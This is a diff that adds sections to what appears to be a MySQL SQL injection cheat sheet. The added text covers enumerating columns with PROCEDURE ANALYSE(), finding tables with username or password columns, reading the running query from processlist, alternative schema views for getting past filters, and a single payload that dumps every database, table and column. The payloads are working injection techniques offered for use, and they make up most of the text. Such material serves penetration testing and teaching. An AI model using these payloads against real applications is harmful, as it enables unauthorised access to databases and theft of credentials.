@@ -118,4 +118,61 @@ UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE tab
 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
 ```
 
+#### Using PROCEDURE ANALYSE() (Legacy)
+
+_Note: Deprecated in MySQL 5.7, removed in MySQL 8.0._
+
+This technique can automatically extract column information when a query's output is displayed:
+
+```sql
+-- Appends column info to the query result
+1 PROCEDURE ANALYSE()          -- First column
+1 LIMIT 1,1 PROCEDURE ANALYSE() -- Second column
+```
+
+It requires that one of the selected columns in the injection point is displayed by the application. This is useful when `UNION` is filtered or unavailable.
+
 **Note:** In MySQL 5, use `version=10` when querying `information_schema.tables`.
+
+### Find Tables by Column Name
+
+When looking for specific data like usernames or passwords:
+
+```sql
+-- Find tables containing a specific column
+SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
+
+-- Find tables with columns matching a pattern
+SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
+```
+
+### Current Query Inspection
+
+Available in MySQL 5.1.7+, you can view the currently executing query:
+
+```sql
+SELECT info FROM information_schema.processlist;
+```
+
+This can reveal the full query structure including parts you cannot see in the application response.
+
+### Alternative information_schema Views
+
+When `information_schema.tables` or `information_schema.columns` are blocked:
+
+| Alternative View                       | Contains Table Names |
+| -------------------------------------- | -------------------- |
+| `information_schema.partitions`        | Yes                  |
+| `information_schema.statistics`        | Yes                  |
+| `information_schema.key_column_usage`  | Yes                  |
+| `information_schema.table_constraints` | Yes                  |
+
+### Retrieving Multiple Databases at Once
+
+This advanced payload retrieves all databases, tables, and columns in a single query:
+
+```sql
+SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ]>',table_name,' > ',column_name))))x
+```
+
+This technique uses variable assignment within a subquery to concatenate all schema information into a single result.
